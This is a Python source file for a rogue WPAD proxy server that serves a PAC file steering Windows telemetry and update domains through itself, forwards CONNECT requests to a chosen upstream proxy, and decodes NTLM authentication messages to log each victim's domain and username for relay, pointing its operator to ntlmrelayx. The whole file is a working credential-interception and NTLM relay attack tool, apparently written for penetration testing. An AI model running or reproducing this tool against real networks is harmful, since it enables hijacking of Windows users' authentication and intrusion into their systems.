#!/usr/bin/env python3

import argparse
import re
import select
import socket
import socketserver
from urllib.parse import urlsplit
import base64
from scapy.layers.http import HTTPRequest
from scapy.layers.ntlm import NTLM_Header


DEFAULT_DOMAINS = (
    "msftconnecttest.com,"
    "windowsupdate.com,"
    "msn.com,"
    "data.microsoft.com,"
    "smartscreen.microsoft.com"
)

MAX_HEADER_SIZE = 65536
BUFFER_SIZE = 65536

global already_proxied_users
already_proxied_users = {}


GREY   = "\033[90m"
YELLOW = "\033[93m"
RED    = "\033[91m"
GREEN  = "\033[92m"
CYAN   = "\033[96m"
RESET  = "\033[0m"



def parse_domains(value):
    """Parse and validate a comma-separated list of domain names."""
    domains = []

    domain_pattern = re.compile(
        r"^(?=.{1,253}$)"
        r"(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)"
        r"(?:\.(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?))*$"
    )

    for item in value.split(","):
        domain = item.strip().lower().rstrip(".")

        if not domain:
            continue

        if not domain_pattern.fullmatch(domain):
            raise argparse.ArgumentTypeError(
                f"Invalid domain name: {item!r}"
            )

        if domain not in domains:
            domains.append(domain)

    if not domains:
        raise argparse.ArgumentTypeError(
            "At least one domain must be specified"
        )

    return domains


def build_pac(domains, proxy_host, proxy_port):
    """Generate a PAC file routing the specified domains through this server."""

    # PAC proxy directives require IPv6 addresses to be bracketed.
    if ":" in proxy_host and not proxy_host.startswith("["):
        proxy_host = f"[{proxy_host}]"

    conditions = []

    for domain in domains:
        conditions.append(
            f'host == "{domain}" || '
            f'dnsDomainIs(host, ".{domain}")'
        )

    condition_text = "\n        ||\n        ".join(conditions)

    return f"""\
function FindProxyForURL(url, host) {{
    host = host.toLowerCase();

    if (
        {condition_text}
    ) {{
        return "PROXY {proxy_host}:{proxy_port}";
    }}

    return "DIRECT";
}}
"""

def read_http_header(sock, buffer):
    """Read one HTTP header block, preserving any subsequent bytes."""
    delimiter = b"\r\n\r\n"

    while delimiter not in buffer:
        if len(buffer) > MAX_HEADER_SIZE:
            raise ValueError("HTTP headers too large")

        chunk = sock.recv(4096)

        if not chunk:
            return None

        buffer.extend(chunk)

    end = buffer.index(delimiter) + len(delimiter)

    if end > MAX_HEADER_SIZE:
        raise ValueError("HTTP headers too large")

    header = bytes(buffer[:end])
    del buffer[:end]

    return header


def parse_http_headers(header):
    """Parse HTTP headers into a lowercase-keyed dictionary."""
    lines = header.split(b"\r\n")
    headers = {}

    for line in lines[1:]:
        if not line:
            continue

        if b":" not in line:
            continue

        name, value = line.split(b":", 1)

        key = name.decode("ascii", errors="replace").strip().lower()
        value = value.decode("iso-8859-1").strip()

        if key in headers:
            headers[key] += ", " + value
        else:
            headers[key] = value

    return headers


def get_ntlm_credentials(raw_http_bytes):
    try:
        # 1. Parse raw bytes into Scapy's HTTP layer
        req = HTTPRequest(raw_http_bytes)
        if not req:
            return None

        # req.show()
        
        # 2. Extract header from fields
        auth_header = req.fields.get('Proxy_Authorization', req.fields.get('Authorization'))
        if not auth_header:
            return None
            
        # Standardize format to bytes
        if isinstance(auth_header, str):
            auth_header = auth_header.encode('utf-8')
            
        # 3. Verify it is NTLM
        if not auth_header.upper().startswith(b'NTLM '):
            return None
            
        # Isolate and decode the Base64 NTLM token
        _, b64_token = auth_header.split(b' ', 1)
        raw_ntlm = base64.b64decode(b64_token)
        
        # 4. Parse using Scapy's NTLM layer
        ntlm_pkt = NTLM_Header(raw_ntlm)
        
        # Check against both numeric 3 or string label from your dump
        msg_type = getattr(ntlm_pkt, 'MessageType', None)
        if msg_type in (3, 'AUTHENTICATE_MESSAGE', b'AUTHENTICATE_MESSAGE'):
            
            # Extract fields directly as they are mapped in your dump
            domain = ntlm_pkt.DomainName
            user = ntlm_pkt.UserName
            
            # Ensure they are handled as native Python strings
            if isinstance(domain, bytes):
                domain = domain.decode('utf-16-le', errors='ignore')
            if isinstance(user, bytes):
                user = user.decode('utf-16-le', errors='ignore')
                
            return str(domain), str(user)
            
    except Exception:
        # Fail safely with no errors on malformed tokens
        return None
        
    return None



def parse_status_code(response_header):
    """Extract the HTTP response status code."""
    try:
        status_line = response_header.split(b"\r\n", 1)[0]
        parts = status_line.split()

        if len(parts) < 2:
            return None

        return int(parts[1])
    except (ValueError, IndexError):
        return None


def send_http_error(client, status, reason):
    """Send an HTTP error response and close the client connection."""
    response = (
        f"HTTP/1.1 {status} {reason}\r\n"
        "Connection: close\r\n"
        "Content-Length: 0\r\n"
        "\r\n"
    ).encode("ascii")

    try:
        client.sendall(response)
    except OSError:
        pass


def relay_exact(src, dst, buffer, length):
    """Relay exactly length bytes, consuming buffered data first."""
    remaining = length

    while remaining:
        if buffer:
            count = min(remaining, len(buffer))
            chunk = bytes(buffer[:count])
            del buffer[:count]
        else:
            chunk = src.recv(min(BUFFER_SIZE, remaining))

            if not chunk:
                raise ConnectionError("Unexpected EOF in HTTP body")

        dst.sendall(chunk)
        remaining -= len(chunk)


def read_line(sock, buffer, max_line_size=8192):
    """Read one CRLF-terminated line without consuming subsequent data."""
    while b"\r\n" not in buffer:
        if len(buffer) > max_line_size:
            raise ValueError("HTTP line too large")

        chunk = sock.recv(4096)

        if not chunk:
            raise ConnectionError("Unexpected EOF reading HTTP line")

        buffer.extend(chunk)

    end = buffer.index(b"\r\n") + 2

    if end > max_line_size:
        raise ValueError("HTTP line too large")

    line = bytes(buffer[:end])
    del buffer[:end]

    return line


def read_exact_bytes(sock, buffer, length):
    """Read a small, exact number of bytes."""
    result = bytearray()

    while len(result) < length:
        if buffer:
            count = min(length - len(result), len(buffer))
            result.extend(buffer[:count])
            del buffer[:count]
        else:
            chunk = sock.recv(length - len(result))

            if not chunk:
                raise ConnectionError("Unexpected EOF")

            result.extend(chunk)

    return bytes(result)


def relay_chunked_body(src, dst, buffer):
    """Relay an HTTP chunked body, including its terminating trailers."""
    while True:
        line = read_line(src, buffer)
        dst.sendall(line)

        size_text = line[:-2].split(b";", 1)[0].strip()

        try:
            size = int(size_text, 16)
        except ValueError as exc:
            raise ValueError("Invalid HTTP chunk size") from exc

        if size == 0:
            # Forward trailers through the final empty line.
            while True:
                trailer = read_line(src, buffer)
                dst.sendall(trailer)

                if trailer == b"\r\n":
                    return

        relay_exact(src, dst, buffer, size)

        ending = read_exact_bytes(src, buffer, 2)

        if ending != b"\r\n":
            raise ValueError("Invalid HTTP chunk terminator")

        dst.sendall(ending)


def relay_response_body(src, dst, buffer, headers):
    """
    Relay a framed HTTP response body.

    Return True if the upstream connection may be reused.
    Return False if the response requires the connection to close.
    """
    transfer_encoding = headers.get("transfer-encoding", "").lower()
    connection = headers.get("connection", "").lower()
    proxy_connection = headers.get("proxy-connection", "").lower()

    must_close = (
        "close" in connection.split(",")
        or "close" in proxy_connection.split(",")
    )

    if "chunked" in transfer_encoding.split(","):
        relay_chunked_body(src, dst, buffer)
        return not must_close

    content_length = headers.get("content-length")

    if content_length is not None:
        try:
            length = int(content_length)
        except ValueError as exc:
            raise ValueError("Invalid Content-Length") from exc

        if length < 0:
            raise ValueError("Negative Content-Length")

        relay_exact(src, dst, buffer, length)
        return not must_close

    # Without explicit body framing, the response is close-delimited.
    # Forward everything until the upstream closes the connection.
    if buffer:
        dst.sendall(buffer)
        buffer.clear()

    while True:
        chunk = src.recv(BUFFER_SIZE)

        if not chunk:
            return False

        dst.sendall(chunk)


def relay_bidirectional(client, upstream, client_buffer, upstream_buffer):
    """Relay pending bytes and then tunnel traffic in both directions."""
    if client_buffer:
        upstream.sendall(client_buffer)
        client_buffer.clear()

    if upstream_buffer:
        client.sendall(upstream_buffer)
        upstream_buffer.clear()

    client.settimeout(None)
    upstream.settimeout(None)

    sockets = [client, upstream]

    while sockets:
        readable, _, _ = select.select(sockets, [], [])

        for sock in readable:
            try:
                chunk = sock.recv(BUFFER_SIZE)
            except OSError:
                chunk = b""

            if not chunk:
                sockets.remove(sock)

                other = upstream if sock is client else client

                try:
                    other.shutdown(socket.SHUT_WR)
                except OSError:
                    pass

                continue

            other = upstream if sock is client else client

            try:
                other.sendall(chunk)
            except OSError:
                return



class WPADHandler(socketserver.BaseRequestHandler):

    def handle(self):
        client = self.request
        client.settimeout(30)

        data = bytearray()

        try:
            # Read the complete HTTP headers.
            while b"\r\n\r\n" not in data:
                chunk = client.recv(4096)

                if not chunk:
                    return

                data.extend(chunk)

                if len(data) > MAX_HEADER_SIZE:
                    client.sendall(
                        b"HTTP/1.1 431 Request Header Fields Too Large\r\n"
                        b"Connection: close\r\n"
                        b"Content-Length: 0\r\n\r\n"
                    )
                    return

            header_end = data.index(b"\r\n\r\n") + 4
            header_bytes = bytes(data[:header_end])

            # Parse the request line.
            request_line = header_bytes.split(b"\r\n", 1)[0]
            parts = request_line.split()

            if len(parts) != 3:
                client.sendall(
                    b"HTTP/1.1 400 Bad Request\r\n"
                    b"Connection: close\r\n"
                    b"Content-Length: 0\r\n\r\n"
                )
                return

            method = parts[0].decode("ascii", errors="replace")
            target = parts[1].decode("ascii", errors="replace")

            path = urlsplit(target).path

            # Serve the PAC file locally.
            if path.rstrip("/").lower() == "/wpad.dat":
                self.serve_wpad(client)
                return

            # All other HTTP requests, including CONNECT, are forwarded.
            self.forward_to_destination(client, data)

        except (ConnectionError, OSError, ValueError) as exc:
            print(f"[!] Client {self.client_address}: {exc}")

    def serve_wpad(self, client):
        content = build_pac(
            self.server.domains,
            self.server.advertise_host,
            self.server.server_address[1],
        ).encode("utf-8")

        response = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Type: application/x-ns-proxy-autoconfig\r\n"
            b"Content-Length: " + str(len(content)).encode("ascii") + b"\r\n"
            b"Cache-Control: no-cache\r\n"
            b"Connection: close\r\n"
            b"\r\n"
        )

        client.sendall(response + content)

        print(f"{GREEN}[WPAD] Served PAC file to {self.client_address}{RESET}")

    def forward_to_destination(self, client, initial_data):
        dst_ip = self.server.dst_ip
        dst_port = self.server.dst_port

        client_buffer = bytearray(initial_data)
        upstream_buffer = bytearray()

        upstream = None

        try:
            # Parse the first HTTP request before opening the upstream
            # connection. This lets us reject a prohibited CONNECT locally.
            request_header = read_http_header(client, client_buffer)

            if request_header is None:
                return

            request_line = request_header.split(b"\r\n", 1)[0]
            parts = request_line.split()

            if len(parts) != 3:
                send_http_error(client, 400, "Bad Request")
                return

            method = parts[0].decode("ascii", errors="replace").upper()
            target = parts[1].decode("ascii", errors="replace")

            # if method != "CONNECT":
            #     # Preserve the original forwarding behavior for ordinary
            #     # HTTP requests. No authentication parsing is performed.
            #     upstream = socket.create_connection(
            #         (dst_ip, dst_port),
            #         timeout=10,
            #     )

            #     print(
            #         f"[FORWARD] {self.client_address} -> "
            #         f"{dst_ip}:{dst_port}"
            #     )

            #     upstream.sendall(request_header)

            #     if client_buffer:
            #         upstream.sendall(client_buffer)
            #         client_buffer.clear()

            #     relay_bidirectional(
            #         client,
            #         upstream,
            #         client_buffer,
            #         upstream_buffer,
            #     )
            #     return

            # Process CONNECT requests, including authentication retries.
            while True:

                print(f"{GREY}[INTERCEPTED CONNECTION] {self.client_address} -> ", f"{target}{RESET}")

                res = None
                res = get_ntlm_credentials(request_header)
                if res is not None:
                    if res in already_proxied_users:
                        print(f"[BLOCKED] {GREEN}Not proxying auth again from {CYAN}{res[0]}/{res[1]}{RESET} (I've seen this account before)")
                        send_http_error(client, 403, "Forbidden")
                        return
                    else:
                        already_proxied_users[res] = True
                        print(f"{YELLOW}[AUTH] Proxying auth from {CYAN}{res[0]}/{res[1]}{RESET}. {RED}Check ntlmrelayx/proxy_responder.py.{RESET}")
                    

                # # Apply the rule to every CONNECT before forwarding it.
                # if hostname.startswith("proxyretried"):
                #     print(
                #         f"[BLOCKED] CONNECT to prohibited hostname "
                #         f"{hostname!r} from {self.client_address}"
                #     )

                #     send_http_error(client, 403, "Forbidden")
                #     return

                # Create the upstream connection only after checking
                # the first CONNECT target.
                if upstream is None:
                    upstream = socket.create_connection(
                        (dst_ip, dst_port),
                        timeout=10,
                    )

                    print(
                        f"{GREY}[FORWARD] {self.client_address} -> "
                        f"{dst_ip}:{dst_port}{RESET}"
                    )

                upstream.sendall(request_header)

                # Read and forward the upstream response headers.
                response_header = read_http_header(
                    upstream,
                    upstream_buffer,
                )

                if response_header is None:
                    return

                status = parse_status_code(response_header)

                if status is None:
                    raise ValueError("Invalid upstream HTTP status line")

                client.sendall(response_header)

                # Handle an informational response before reading the
                # final response to this CONNECT request.
                while 100 <= status < 200 and status != 101:
                    response_header = read_http_header(
                        upstream,
                        upstream_buffer,
                    )

                    if response_header is None:
                        return

                    status = parse_status_code(response_header)

                    if status is None:
                        raise ValueError("Invalid upstream HTTP status line")

                    client.sendall(response_header)

                response_headers = parse_http_headers(response_header)

                if status == 407:
                    # Consume and forward the 407 response body before
                    # waiting for the client's next CONNECT attempt.
                    reusable = relay_response_body(
                        upstream,
                        client,
                        upstream_buffer,
                        response_headers,
                    )

                    if not reusable:
                        return

                    # Read the next HTTP request from the same client.
                    # Any buffered bytes beyond the previous headers
                    # remain available here.
                    request_header = read_http_header(
                        client,
                        client_buffer,
                    )

                    if request_header is None:
                        return

                    request_line = request_header.split(b"\r\n", 1)[0]
                    parts = request_line.split()

                    if len(parts) != 3:
                        send_http_error(client, 400, "Bad Request")
                        return

                    method = parts[0].decode(
                        "ascii",
                        errors="replace",
                    ).upper()

                    target = parts[1].decode(
                        "ascii",
                        errors="replace",
                    )

                    # if method != "CONNECT":
                    #     # Authentication negotiation has changed into
                    #     # an ordinary HTTP request. Preserve forwarding
                    #     # behavior rather than interpreting its contents.
                    #     upstream.sendall(request_header)

                    #     if client_buffer:
                    #         upstream.sendall(client_buffer)
                    #         client_buffer.clear()

                    #     relay_bidirectional(
                    #         client,
                    #         upstream,
                    #         client_buffer,
                    #         upstream_buffer,
                    #     )
                    #     return

                    # Loop back and check the hostname on this CONNECT,
                    # before sending it to the upstream proxy.
                    continue

                if 200 <= status < 300:
                    # print(
                    #     f"[CONNECT] Tunnel established for "
                    #     f"{self.client_address}"
                    # )

                    # CONNECT succeeded. Switch to transparent tunneling.
                    # Buffered bytes may contain the beginning of the
                    # client's TLS handshake or upstream tunnel data.
                    relay_bidirectional(
                        client,
                        upstream,
                        client_buffer,
                        upstream_buffer,
                    )
                    return

                # Other CONNECT responses (for example, 403 or 502):
                # forward any framed response body and close the connection.
                relay_response_body(
                    upstream,
                    client,
                    upstream_buffer,
                    response_headers,
                )
                return

        except (ConnectionError, OSError, ValueError) as exc:
            print(f"[!] Proxy error for {self.client_address}: {exc}")

        finally:
            if upstream is not None:
                try:
                    upstream.close()
                except OSError:
                    pass



class WPADServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(
        self,
        address,
        handler,
        dst_ip,
        dst_port,
        advertise_host,
        domains,
    ):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.advertise_host = advertise_host
        self.domains = domains

        super().__init__(address, handler)


def main():
    parser = argparse.ArgumentParser(
        description=(
            "Serve wpad.dat and forward proxy connections "
            "to an upstream proxy."
        )
    )

    parser.add_argument(
        "--dst-ip",
        required=True,
        help="Upstream proxy IP address",
    )

    parser.add_argument(
        "--dst-port",
        type=int,
        required=True,
        help="Upstream proxy port",
    )

    parser.add_argument(
        "--listen-host",
        default="0.0.0.0",
        help="Local address to listen on (default: 0.0.0.0)",
    )

    parser.add_argument(
        "--listen-port",
        type=int,
        default=80,
        help="Local listening port (default: 80)",
    )

    parser.add_argument(
        "--advertise-host",
        help=(
            "IP address or hostname clients use to reach this proxy. "
            "Required when listening on a wildcard address."
        ),
    )

    parser.add_argument(
        "--domains",
        type=parse_domains,
        default=parse_domains(DEFAULT_DOMAINS),
        help=(
            "Comma-separated list of domains and subdomains to proxy. "
            f"Default: {DEFAULT_DOMAINS}"
        ),
    )

    args = parser.parse_args()

    if not 1 <= args.dst_port <= 65535:
        parser.error("--dst-port must be between 1 and 65535")

    if not 1 <= args.listen_port <= 65535:
        parser.error("--listen-port must be between 1 and 65535")

    advertise_host = args.advertise_host

    if not advertise_host:
        if args.listen_host in ("0.0.0.0", "::"):
            parser.error(
                "--advertise-host is required when --listen-host "
                "is 0.0.0.0 or ::"
            )

        advertise_host = args.listen_host

    try:
        with WPADServer(
            (args.listen_host, args.listen_port),
            WPADHandler,
            args.dst_ip,
            args.dst_port,
            advertise_host,
            args.domains,
        ) as server:

            print(
                f"[*] Listening on "
                f"{args.listen_host}:{server.server_address[1]}"
            )

            print(
                f"[*] Advertised proxy: "
                f"{advertise_host}:{server.server_address[1]}"
            )

            print(
                f"[*] Upstream proxy: "
                f"{args.dst_ip}:{args.dst_port}"
            )

            print(f"[*] Domains: {', '.join(args.domains)}")

            print(
                f"[*] WPAD URL: "
                f"http://{advertise_host}:"
                f"{server.server_address[1]}/wpad.dat"
            )

            server.serve_forever()

    except KeyboardInterrupt:
        print("\n[*] Server stopped")


if __name__ == "__main__":
    main()
